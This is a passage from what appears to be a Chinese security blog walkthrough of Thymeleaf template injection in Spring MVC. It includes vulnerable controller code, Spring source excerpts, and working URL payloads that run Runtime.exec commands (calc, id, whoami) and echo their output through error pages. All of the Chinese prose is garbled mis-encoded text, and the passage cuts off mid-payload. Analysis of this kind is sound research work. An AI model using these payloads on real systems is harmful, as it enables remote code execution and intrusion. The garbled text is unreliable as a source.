href="http://localhost:8080/employees/nego/Jack?format=json">http://localhost:8080/employees/nego/Jack?format=json</a><br>è¿”å›ç»“æœä¸ºJSON</p></li></ol><p>æ¥ä¸‹æ¥è·Ÿè¿›åˆ°<code>ContentNegotiatingViewResolver#resolveViewName</code>æ–¹æ³•</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195200924.png" alt="image-20240710195200924"></p><p><code>getCandidateViews</code>å¾ªç¯è°ƒç”¨æ‰€æœ‰çš„ViewResolverè§£æè§†å›¾ï¼Œè§£ææˆåŠŸæ”¾åˆ°è§†å›¾åˆ—è¡¨ä¸­è¿”å›ã€‚åŒæ ·ä¹Ÿä¼šæ ¹æ®Acceptå¤´å¾—åˆ°åç¼€å¹¶é€šè¿‡ViewResolverè§£æè§†å›¾</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195405092.png" alt="image-20240710195405092"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195451593.png" alt="image-20240710195451593"></p><br><p>æ¥ä¸‹æ¥è¿›å…¥<code>getBestView</code>ï¼Œæ ¹æ®Acceptå¤´è·å–æœ€ä¼˜çš„è§†å›¾è¿”å›</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710195808153.png" alt="image-20240710195808153"></p><p>æœ€ç»ˆè¿”å›çš„æ˜¯<code>ThymeleafView</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200007899.png" alt="image-20240710200007899"></p><hr><h3 id="è§†å›¾æ¸²æŸ“"><a href="#è§†å›¾æ¸²æŸ“" class="headerlink" title="è§†å›¾æ¸²æŸ“"></a>è§†å›¾æ¸²æŸ“</h3><p>ä¸‹ä¸€æ­¥æ˜¯è°ƒç”¨<code>render</code>æ–¹æ³•</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200308152.png" alt="image-20240710200308152"></p><p>è¿›å…¥<code>ThymleafView#render</code>ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨<code>renderFragment</code>**ï¼Œè¿™é‡Œå°±æ˜¯æ¼æ´è§¦å‘çš„å…³é”®ç‚¹ä¹‹ä¸€äº†</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200453736.png" alt="image-20240710200453736"></p><p>è¯¥æ–¹æ³•åœ¨åé¢é¦–å…ˆåˆ¤æ–­<code>viewTemplateName</code>æ˜¯å¦åŒ…å«<code>::</code>ï¼Œè‹¥åŒ…å«åˆ™è·å–è§£æå™¨</p><p>ç„¶åè°ƒç”¨<code>parseExpression</code>æ–¹æ³•å°†<code>viewTemplateName</code>ï¼ˆä¹Ÿå°±æ˜¯Controllerä¸­æœ€åreturnçš„å€¼)æ„é€ æˆç‰‡æ®µè¡¨è¾¾å¼<code>~&#123;&#125;</code>ï¼‰å¹¶è§£ææ‰§è¡Œ</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710200843665.png" alt="image-20240710200843665"></p><p>å› ä¸ºæˆ‘ä»¬è¿™è¾¹çš„ viewTemplateName ä¸º user&#x2F;en&#x2F;welcomeï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥<code>parseExpression</code></p><hr><h2 id="å›æ˜¾åŸç†"><a href="#å›æ˜¾åŸç†" class="headerlink" title="å›æ˜¾åŸç†"></a>å›æ˜¾åŸç†</h2><p>è¿™ç§å›æ˜¾çš„æœ¬è´¨å…¶å®æ˜¯ <strong>throw æŸä¸ªä¼šåŒ…å«è¡¨è¾¾å¼æ‰§è¡Œç»“æœçš„å¼‚å¸¸</strong>ï¼Œè€Œåœ¨ä½ç‰ˆæœ¬çš„ springboot (&lt;&#x3D; 2.2) ä¸­, <code>server.error.include-message</code> çš„é»˜è®¤å€¼ä¸º <code>always</code>ï¼Œè¿™ä½¿å¾—é»˜è®¤çš„ 500 é¡µé¢ä¼šæ˜¾ç¤ºå¼‚å¸¸ä¿¡æ¯</p><p>ä½†æ˜¯åœ¨é«˜ç‰ˆæœ¬çš„ springboot (&gt;&#x3D; 2.3) ä¸­, ä¸Šè¿°é€‰é¡¹çš„é»˜è®¤å€¼å˜æˆäº† <code>never</code>, é‚£ä¹ˆ 500 é¡µé¢å°±ä¸ä¼šæ˜¾ç¤ºä»»ä½•å¼‚å¸¸ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™ç§å›æ˜¾å½¢å¼è¿˜æ˜¯ä¼šæœ‰ä¸€å®šçš„å±€é™æ€§</p><hr><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="templatename"><a href="#templatename" class="headerlink" title="templatename"></a>templatename</h2><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å…¥payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token operator">?</span>lang<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token punctuation">.</span>exe<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PSï¼šå› ä¸ºè¿™é‡Œæœ€åreturnçš„å€¼ä¸º<code>user/__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()&#125;__::.x/welcome</code>ï¼Œæ— è®ºæˆ‘ä»¬payloadå¦‚ä½•æ„é€ æœ€åéƒ½ä¼šæ‹¼æ¥<code>/welcome</code>ï¼Œæ‰€ä»¥æ ¹æ®å‰é¢åˆ†æå³ä½¿ä¸åŠ <code>.x</code>ä¾ç„¶å¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œ</p><p>ç„¶åç»§ç»­å‰é¢çš„åˆ†æï¼Œè¿™æ ·å°±è¿›å…¥äº†<code>parseExpression</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710201426798.png" alt="image-20240710201426798"></p><p>åœ¨<code>StandardExpressionParser#parseExpression</code>ä¸­</p><p>é€šè¿‡<code>preprocess</code>è¿›è¡Œé¢„å¤„ç†ï¼Œé¢„å¤„ç†æ ¹æ®è¯¥æ­£åˆ™<code>\\_\\_(.*?)\\_\\_</code>æå–<code>__xx__</code>é—´çš„å†…å®¹</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202246428.png" alt="image-20240710202246428"></p><p>è·å–<code>expression</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202506931.png" alt="image-20240710202506931"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿”å›çš„expressionå·²ç»æ˜¯ä¸€ä¸ªSPELè¡¨è¾¾å¼äº†</p><p>æœ€ç»ˆè°ƒç”¨<code>execute</code>æ–¹æ³•ï¼Œæ‰§è¡Œè¡¨è¾¾å¼</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202537749.png" alt="image-20240710202537749"></p><p>äºæ˜¯å°±å¼¹å‡ºè®¡ç®—å™¨äº†ï¼ŒåŒæ—¶æŠ›å‡ºé”™è¯¯</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710202804970.png" alt="image-20240710202804970"></p><p>æ‰€ä»¥è¿™ä¸ªæ¼æ´çš„æœ¬è´¨æ˜¯<strong>SPELè¡¨è¾¾å¼æ‰§è¡Œ</strong></p><hr><h2 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h2><p>å¯¹äº<code>~&#123;templatename::selector&#125;</code>ï¼Œå› ä¸ºå‰é¢æ˜¯åœ¨templatenameçš„ä½ç½®æ³¨å…¥è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŒæ ·ä¹Ÿå¯ä»¥åœ¨selectorå¤„è¿›è¡Œæ³¨å…¥</p><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/fragment"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">fragment</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> section<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"welcome :: "</span> <span class="token operator">+</span> section<span class="token punctuation">;</span> <span class="token comment">//fragment is tainted</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>fragment<span class="token operator">?</span>section<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¶å®è¿™é‡Œä¹Ÿå¯ä»¥ä¸éœ€è¦<code>.x</code>å’Œ<code>::</code>ä¹Ÿå¯è§¦å‘å‘½ä»¤æ‰§è¡Œ</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œtemplatenameå’Œselectorè¿™ä¸¤ä¸ªåœ°æ–¹çš„æ³¨å…¥ç‚¹ä¸åŒä¼šå¯¼è‡´æœ‰æ— å›æ˜¾çš„å·®åˆ«ï¼Œå³æœ€åæŠ›å‡ºå¼‚å¸¸ï¼Œtemplatenameæ˜¯å­˜åœ¨ç»“æœå›æ˜¾çš„è€Œæ‰¾ä¸åˆ°selectorä¸å­˜åœ¨ç»“æœå›æ˜¾</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204032791.png" alt="image-20240710204032791"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710204046819.png" alt="image-20240710204046819"></p><p>åŸå› æ˜¯æœ€ç»ˆæŠ›å‡º <code>TemplateInputException</code> å¼‚å¸¸çš„æ—¶å€™æºå¸¦çš„æ˜¯ templateï¼Œä¹Ÿå°±æ˜¯ <code>::</code> å‰é¢çš„å†…å®¹ï¼Œå¹¶æ²¡æœ‰å¸¦å‡º selectorï¼Œè¯¦æƒ…çœ‹ä¸‹é¢çš„å›æ˜¾åˆ†æ</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710205345656.png" alt="image-20240710205345656"></p><hr><h2 id="URI-path"><a href="#URI-path" class="headerlink" title="URI path"></a>URI path</h2><p>æ¼æ´ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//returns void, so view name is taken from URI</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>calc<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‰é¢æè¿‡ï¼Œåœ¨<code>applyDefaultViewName</code>æ–¹æ³•å¤„å¯¹å½“å‰ModelAndViewåšåˆ¤æ–­ï¼Œå¦‚æœä¸ºnullåˆ™è¿›å…¥defalutViewNameéƒ¨åˆ†å¤„ç†ï¼Œå°†URI pathä½œä¸ºmavçš„å€¼å³ä½œä¸ºè§†å›¾åç§°</p><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨<code>&#123;document&#125;</code>ä½ç½®ä¼ å…¥payloadï¼Œèƒ½ç›´æ¥å¼¹è®¡ç®—å™¨</p><p>ä½†æ˜¯å½“æˆ‘ä»¬å°è¯•æ‰§è¡Œ whoami æ—¶ï¼Œå¹¶æ²¡æœ‰äº§ç”Ÿå›æ˜¾ï¼Œè€Œæ˜¯åŸå°ä¸åŠ¨è¾“å‡ºäº†æˆ‘ä»¬çš„payload</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240710211509566.png" alt="image-20240710211509566"></p><p>è¿™æ˜¯å› ä¸ºè¿™ä¸ªcontrolleræ²¡æœ‰è¿”å›å€¼ï¼Œä¹Ÿä¸èƒ½æœ‰è¿”å›å€¼ï¼Œå¦åˆ™å°±ä¸ä¼šè°ƒç”¨<code>applyDefaultViewName</code>è®¾ç½®ï¼Œå¦‚æœæˆ‘ä»¬çš„controlleræ”¹æˆä¸‹é¢è¿™æ ·ï¼Œå°†ä¸ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"welcome"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ„é€ å›æ˜¾"><a href="#æ„é€ å›æ˜¾" class="headerlink" title="æ„é€ å›æ˜¾"></a>æ„é€ å›æ˜¾</h3><p>templatenameéƒ¨åˆ†å¯æ§ï¼Œæ²¡å›æ˜¾çš„åŸå› åœ¨äºdefaultViewä¸­å¯¹URI pathçš„å¤„ç†ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨payloadçš„æœ€ååŠ ä¸¤ä¸ª<code>.</code></p><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>whoami<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>::</code>å¿…é¡»æ”¾åœ¨åé¢ï¼Œæ”¾åœ¨å‰é¢è™½ç„¶å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œç±»ä¼¼äºtemplatenameå’Œselectorçš„åŒºåˆ«</p><p>é€ æˆè¿™ä¸ªé—®é¢˜çš„åœ°æ–¹åœ¨<code>StandardExpressionParser#parseExpression</code>ï¼Œ<strong>åœ¨<code>preprocess</code>é¢„å¤„ç†ç»“æŸå</strong>è¿˜ä¼šå†èµ°<code>Expression.parse</code>è¿›è¡Œä¸€æ¬¡è§£æï¼Œè¿™é‡Œå¦‚æœè§£æå¤±è´¥åˆ™ä¸ä¼šå›æ˜¾</p><p>ç°åœ¨æ¥ä½¿ç”¨<code>::.x</code>ç»“å°¾çš„payloadï¼š</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022303079.png" alt="image-20240711022303079"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œ<code>::</code>åé¢æ˜¯æ²¡æœ‰å†…å®¹çš„ï¼Œå› æ­¤è§£æåexpressionçš„å€¼ä¸ºnullï¼Œæ‰€ä»¥æœ€ç»ˆä¼šæŠ›å‡º<code>IllegalArgumentException</code>å¼‚å¸¸ï¼Œæºå¸¦çš„å¼‚å¸¸ä¿¡æ¯åªåŒ…å«äº†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹, å¹¶æ²¡æœ‰å‘½ä»¤çš„å›æ˜¾</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711103449462.png" alt="image-20240711103449462"></p><br><p>è€Œä½¿ç”¨<code>::..</code>ç»“å°¾çš„payloadï¼š</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711022515345.png" alt="image-20240711022515345"></p><p>è¿™ä¸€æ­¥æ˜¯æ­£å¸¸è§£æå‡ºäº†expressionï¼Œå€¼å˜æˆ FragmentExpression</p><p>ä¹‹åè¿”å›åˆ° <code>ThymeleafView#renderFragment</code> æ–¹æ³•, å¾€ä¸‹ä¼šå°†è¡¨è¾¾å¼æ‰§è¡Œç»“æœä½œä¸º templateNameï¼Œå¹¶æå–å‡º <code>::</code> åé¢çš„å†…å®¹ä½œä¸º selector</p><p>ç„¶åè°ƒç”¨ <code>viewTemplateEngine.process()</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711104350408.png" alt="image-20240711104350408"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105057414.png" alt="image-20240711105057414"></p><p>è·Ÿè¿› <code>TemplateManager#resolveTemplate</code></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105238882.png" alt="image-20240711105238882"></p><p>templateResolver è´Ÿè´£åœ¨ classpath (prefix) ä¸‹ä¾æ® template (name) å’Œ suffix å¯»æ‰¾å¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶</p><p>è¿™é‡Œè‚¯å®šæ˜¯æ‰¾ä¸åˆ°çš„, æ‰€ä»¥ä¼šæŠ›å‡º TemplateInputException å¼‚å¸¸, ä½†æ˜¯è¿™ä¸ªå¼‚å¸¸ä¼šå¸¦å‡º tempate åç§°å¹¶æœ€ç»ˆæ˜¾ç¤ºåœ¨ 500 é¡µé¢ä¸­, å› æ­¤è¾¾åˆ°äº†å›æ˜¾çš„æ•ˆæœ</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711105820284.png" alt="image-20240711105820284"></p><hr><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç°åœ¨åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆ<code>::.x</code>ä¼šè¢«å»æ‰ï¼š</p><p>åœ¨åˆ†æ<code>URI PATH</code>è¿™ç§æ–¹å¼èƒ½è·å–<code>ModelAndView</code>çš„åŸå› æ—¶ï¼Œæˆ‘ä»¬åˆ†æè¿‡åœ¨<code>applyDefaultViewName</code>ä¸­è·å–URI Pathä½œä¸º<code>ModelAndView</code>çš„nameï¼Œè¿™ä¸ªæ“ä½œåœ¨<code>DefaultRequestToViewNameTranslator#getViewName</code>ä¸­å®Œæˆ</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024115948.png" alt="image-20240711024115948"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024130741.png" alt="image-20240711024130741"></p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024213451.png" alt="image-20240711024213451"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getViewName</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> lookupPath <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>urlPathHelper<span class="token punctuation">.</span><span class="token function">getLookupPathForRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> <span class="token class-name">HandlerMapping</span><span class="token punctuation">.</span><span class="token constant">LOOKUP_PATH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>prefix <span class="token operator">+</span> <span class="token function">transformPath</span><span class="token punctuation">(</span>lookupPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>suffix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getLookupPathForRequest</code>ä»…ä»…è·å–äº†è¯·æ±‚çš„åœ°å€å¹¶æ²¡æœ‰å¯¹åé¢çš„<code>.x</code>åšå¤„ç†ï¼Œå¤„ç†ä¸»è¦æ˜¯åœ¨<code>transformPath</code>ä¸­å®Œæˆçš„</p><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024400363.png" alt="image-20240711024400363"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Nullable</span><span class="token keyword">protected</span> <span class="token class-name">String</span> <span class="token function">transformPath</span><span class="token punctuation">(</span><span class="token class-name">String</span> lookupPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> path <span class="token operator">=</span> lookupPath<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripLeadingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripTrailingSlash <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token constant">SLASH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stripExtension<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">stripFilenameExtension</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">SLASH</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>path <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token constant">SLASH</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>separator<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> path<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/10/Thymeleaf-SSTI/image-20240711024501146.png" alt="image-20240711024501146"></p><p><code>stripFilenameExtension</code>ä¼šå»é™¤æœ€åä¸€ä¸ª<code>.</code>åçš„å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼ç»•è¿‡</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>doc<span class="token operator">/</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span 